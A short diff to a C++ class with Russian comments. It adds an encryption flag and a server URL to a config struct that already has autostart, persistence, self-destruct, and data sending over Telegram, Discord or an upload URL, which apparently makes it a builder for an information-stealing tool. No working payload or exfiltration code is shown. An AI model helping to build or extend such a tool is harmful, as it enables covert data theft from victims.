@@ -92,6 +92,7 @@ public:
         bool autoStart = false;            // Включение автозапуска
         bool persist = false;              // Включение персистентности
         bool selfDestruct = false;         // Включение самоуничтожения
+        bool encryptData = false;          // Включение шифрования данных (ДОБАВЛЕНО)
         std::string sendMethod = "Local File";  // Метод отправки данных (Telegram, Discord, Local File)
         std::string buildMethod = "Local Build"; // Метод сборки (Local Build, GitHub Actions)
         std::string telegramToken = "";         // Токен для Telegram
@@ -105,6 +106,7 @@ public:
         std::string githubToken = "";           // Токен GitHub
         std::string githubRepo = "";            // Репозиторий GitHub
         std::string uploadUrl = "http://example.com/upload"; // URL для отправки данных
+        std::string serverUrl = "";             // URL сервера для отправки данных (ДОБАВЛЕНО)
     } config;
 
     // UI элементы
